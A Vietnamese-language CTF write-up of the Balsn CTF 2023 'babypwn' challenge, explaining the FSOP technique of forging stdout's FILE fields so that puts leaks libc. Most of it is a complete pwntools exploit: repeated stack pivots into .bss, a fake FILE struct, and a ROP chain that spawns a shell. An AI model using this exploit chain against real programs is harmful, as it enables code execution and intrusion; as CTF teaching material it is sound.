# FSOP

nay ta sẽ research 1 kĩ thuật mới đó **FSOP**

## Introduce
vì **@hlaan** và **@whoisthatguy** đã viết write up chi tiết cũng như đầy đủ về **FSOP** rồi , nên mình sẽ để link ở đây cho mọi người research luôn: 

- **hlaan:** https://hackmd.io/@trhoanglan04/SJWrxsQs2#FSOP 
- **whoisthatguy:** https://hackmd.io/@whoisthatguy/Hke0xJaLWp
## Puts Exploit 

và giờ mình sẽ tóm tắt (theo mình hiểu) lại về cách **khai thác hàm puts bằng kĩ thuật FSOP để leak libc:**
- khi ta thực thi hàm puts , trong puts sẽ có các hàm con của nó như sau:
```
puts → __IO_puts → _IO_new_file_xsputn → _IO_new_file_overflow → _IO_do_write → _IO_new_do_write → new_do_write
```
và mỗi hàm trên đều có các điều kiện mà ta cần bypass, để hiểu rõ chi tiết thì có thể đọc 2 wu trên, đây mình sẽ tóm gọn cách leak libc:
- overwrite **_flag** thành **0xfbad1800** 
- overwrite **_IO_read_ptr,  _IO_read_end, _IO_read_base, _IO_write_base** thành địa chỉ (ptr) có chứa libc (got, plt,...) **(ptr phải là địa chỉ ghi được)**
- overwrite **_IO_write_ptr, _IO_write_end, _IO_buf_base, _IO_buf_end** thành ptr + offset(offset là số byte ta in ra)
- lúc này hàm puts sẽ in libc mà ptr đang trỏ đến và ta có được libc để khai thác

bây giờ ta sẽ làm chall sử dụng FSOP để hiểu thêm 

## babypwn 2023 (balsn CTF) 

- binary khá là đơn giản 

## ida 

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[32]; // [rsp+0h] [rbp-20h] BYREF

  setvbuf(_bss_start, 0LL, 2, 0LL);
  gets(v4);
  puts("Baby PWN 2023 :)");
  return 0;
}
``` 

## Analysis
- có BOF bug
- nhìn sơ qua thì nghĩ là ret2libc cơ bản, nhưng ta thử check các gadget xem 

![image](https://github.com/gookoosss/CTF/assets/128712571/36f57004-c9a9-4f8f-8aff-0111dc69f6e0)


- hmm không có pop rdi để ta leak libc như bình thường rồi, nhưng ta lại có leave; ret gadget => leak libc => **FSOP** 

## Exploit 

- chúng ta sẽ dùng FSOP để leak libc, vì vậy ta cần overwrite stdout ptr
- nhưng làm sao ta có thể nhập được vào std ptr đây, sau mấy ngày research thì mình biết có 1 cách đó là sử dụng kĩ thuật **Stack Pivoting** 

### Stack Pivoting

**writeup:** https://github.com/gookoosss/CTF/blob/main/PWN/training/Stack%20Pivoting.md

- theo như mình research thì mỗi lần call puts với rsp đang trỏ đến địa chỉ ghi được( **exe.bss()** ), thì địa chỉ đó sẽ được cấp 1 địa chỉ IO ngẫu nhiên từ libc, để kiểm chứng thì ta sẽ thử debug xem sao 

![image](https://github.com/gookoosss/CTF/assets/128712571/7d7e30e6-2491-4f0c-bc16-2caaf984373e)


- trước khi puts thì 0x404368 đang là null 

![image](https://github.com/gookoosss/CTF/assets/128712571/d6676e6d-447c-4b57-8c97-5ec8730fe64b)


- và đây là sau khi puts, **0x404368 chứa 0x7fbe8b461f6d (_IO_file_write@@GLIBC_2.2.5+45)** 
- nhưng mà lúc này địa chỉ **_IO_file_write** lại lớn hơn địa chỉ stdout ptr , ta cần địa chỉ nào nhỏ hơn để có thể overwrite nó 
- ta sẽ dùng **Stack Pivoting** tiếp cho đến khi nào ra địa chỉ hợp lý  

![image](https://github.com/gookoosss/CTF/assets/128712571/726d58ca-fff9-47b9-bb87-08778fec2008)

- stderr thì chắc chắn nhỏ hơn stdout rồi , sử dụng gadget leave ; ret để set rbp thành stderr 

```python 
# Stack pivot to bss

payload = b'a'*32+p64(exe.bss()+0x400 + 0x20)+p64(exe.sym['main']+42) 
p.sendline(payload)

# Stack pivot again

payload = b'a'*32+p64(0x404200+0x20)+p64(exe.sym['main']+42)
p.sendline(payload)

# Stack pivot again

payload = b'a'*32+p64(0x404340+8+0x20)+p64(exe.sym['main']+42)
p.sendline(payload)

# Stack pivot again

payload = b'a'*32+p64(0x404378+8+0x20)+p64(exe.sym['main']+42)
p.sendline(payload) 

# now we can see the address 0x404378 to have _IO_2_1_stderr_+96 (libc)

# use leave; ret gadget set rsp = 0x404378

payload = p64(exe.sym['main']+42)*4 + p64(0x404378) + p64(leave)
p.sendline(payload)
```
- sau khi có thể nhập vào stderr rồi, ta sẽ tính offset đến stdout ptr để overwrite
- trước tiên ta cần tạo 1 fake_file 

```python 
# set up fake_file

fake_file = p64(0xfbad1800) # overwrite _flag to 0xfbad1800

fake_file += p64(0x403fe8)*4 #  overwrite _IO_read_ptr,  _IO_read_end, _IO_read_base, _IO_write_base to the setvbuf@got.plt that have libc

fake_file += p64(0x403fe8 +0x50)*4 # overwrite _IO_write_ptr, _IO_write_end, _IO_buf_base, _IO_buf_end to 0x403fe8 + 0x50 (it will leak 0x50 byte)
```

- có được offset thì ta sẽ overwrite stdout ptr thành fake_file như trên 

```python 
# now rbp = _IO_2_1_stderr_+96 (libc) , we can overwrite important address to the fake_fil and we will have libc

payload = b'\x00'*32 + p64(exe.bss()+0x100) + p64(exe.sym['main']+42)+b'\x00'*112 + fake_file
p.sendline(payload)
```

- lúc này call puts sẽ trả về 0x50byte, bao gồm cả libc => leak libc 

![image](https://github.com/gookoosss/CTF/assets/128712571/47c49ead-518b-49bc-87a0-55c513c191c0)


- có được libc rồi ta sử dụng ret2ROPchain để get shell 

```python 
poprdi = libc.address + 0x000000000002a3e5
poprsi = libc.address + 0x000000000002be51
poprdx = libc.address + 0x000000000011f497
poprax = libc.address + 0x0000000000045eb0
syscall = libc.address + 0x0000000000029db4

payload = b'a'*32+b'b'*8+p64(poprdi)+p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(poprsi)+p64(0)+ p64(poprdx) + p64(0) + p64(0) + p64(poprax)+p64(0x3b)+p64(syscall)
p.sendline(payload)
``` 

![image](https://github.com/gookoosss/CTF/assets/128712571/463fc45f-79de-406f-b89c-522446a9d840)


- 1 chall khá lạ và khó khăn đấy chứ

## script 

```python 
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


p = process([exe.path])

gdb.attach(p, gdbscript = 
"""
b*0x00000000004011bb
b*0x00000000004011c6
c
""")
input() 

leave = 0x00000000004011c5 

# set up fake_file

fake_file = p64(0xfbad1800) # overwrite _flag to 0xfbad1800

fake_file += p64(0x403fe8)*4 #  overwrite _IO_read_ptr,  _IO_read_end, _IO_read_base, _IO_write_base to the setvbuf@got.plt that have libc

fake_file += p64(0x403fe8 +0x50)*4 # overwrite _IO_write_ptr, _IO_write_end, _IO_buf_base, _IO_buf_end to 0x403fe8 + 0x50 (it will leak 0x50 byte)

# Stack pivot to bss

payload = b'a'*32+p64(exe.bss()+0x400 + 0x20)+p64(exe.sym['main']+42) 
p.sendline(payload)

# Stack pivot again

payload = b'a'*32+p64(0x404200+0x20)+p64(exe.sym['main']+42)
p.sendline(payload)

# Stack pivot again

payload = b'a'*32+p64(0x404340+8+0x20)+p64(exe.sym['main']+42)
p.sendline(payload)

# Stack pivot again

payload = b'a'*32+p64(0x404378+8+0x20)+p64(exe.sym['main']+42)
p.sendline(payload) 

# now we can see the address 0x404378 to have _IO_2_1_stderr_+96 (libc)

# use leave; ret gadget set rsp = 0x404378

payload = p64(exe.sym['main']+42)*4 + p64(0x404378) + p64(leave)
p.sendline(payload)

# now rbp = _IO_2_1_stderr_+96 (libc) , we can overwrite important address to the fake_fil and we will have libc

payload = b'\x00'*32 + p64(exe.bss()+0x100) + p64(exe.sym['main']+42)+b'\x00'*112 + fake_file
p.sendline(payload)

for i in range(0,5):
        p.recvline()
leak = u64(p.recv(6) + b'\0\0')
libc.address = leak - libc.sym['setvbuf']
print("libc leak : ",hex(leak))
print(";ibc base : ",hex(libc.address))

# get shell by ret2ropchain

poprdi = libc.address + 0x000000000002a3e5
poprsi = libc.address + 0x000000000002be51
poprdx = libc.address + 0x000000000011f497
poprax = libc.address + 0x0000000000045eb0
syscall = libc.address + 0x0000000000029db4

payload = b'a'*32+b'b'*8+p64(poprdi)+p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(poprsi)+p64(0)+ p64(poprdx) + p64(0) + p64(0) + p64(poprax)+p64(0x3b)+p64(syscall)
p.sendline(payload)

p.interactive()
```
